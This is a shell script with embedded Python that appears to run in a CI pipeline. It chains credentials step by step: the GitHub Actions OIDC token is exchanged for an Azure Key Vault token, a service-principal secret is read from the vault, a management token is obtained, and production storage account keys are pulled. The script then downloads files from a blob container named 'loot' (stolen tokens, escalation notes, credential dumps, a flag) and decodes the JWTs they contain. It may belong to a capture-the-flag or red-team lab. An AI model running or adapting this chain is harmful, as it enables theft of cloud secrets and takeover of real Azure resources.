#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+KVT})
c=json.loads(jg(b)["value"])
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
  {"client_id":c["appId"],"client_secret":c["clientSecret"],
   "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
ARM=jg(b)["access_token"]
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/"
          f"providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01",
          data=b"", headers={"Authorization":"Bearer "+ARM}, method="POST")
open("/tmp/stkey","w").write(jg(b)["keys"][0]["value"])
PYEOF
KEY=$(cat /tmp/stkey); ACCT=sttblcilogsprodx3euoz
CS="DefaultEndpointsProtocol=https;AccountName=$ACCT;AccountKey=$KEY;EndpointSuffix=core.windows.net"
for N in README notes.txt readme.txt beacon.txt armowner_token.json escalation.json mi_loot_1792639046.json creds.json kv_dump.txt last.json out.json zz_out.json flag flag.txt; do
  az storage blob download -c loot -n "$N" --connection-string "$CS" -f "/tmp/$N.bin" --overwrite -o none 2>/dev/null
  echo "===== $N"
  head -c 900 "/tmp/$N.bin" 2>/dev/null
  echo
done
echo "### decode any JWTs found"
python3 - <<'PY2'
import base64, json, glob, re
for f in glob.glob("/tmp/*.bin"):
    d=open(f,"rb").read()
    for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+", d):
        try:
            p=m.group(0).split(b".")[1]; p+=b"="*(-len(p)%4)
            c=json.loads(base64.urlsafe_b64decode(p))
            print(f"  {f}: aud={c.get('aud')} appid={c.get('appid')} oid={c.get('oid')} app_displayname={c.get('app_displayname')} roles={c.get('roles')} idtyp={c.get('idtyp')}")
        except Exception: pass
PY2
rm -f /tmp/stkey
echo "=== done ==="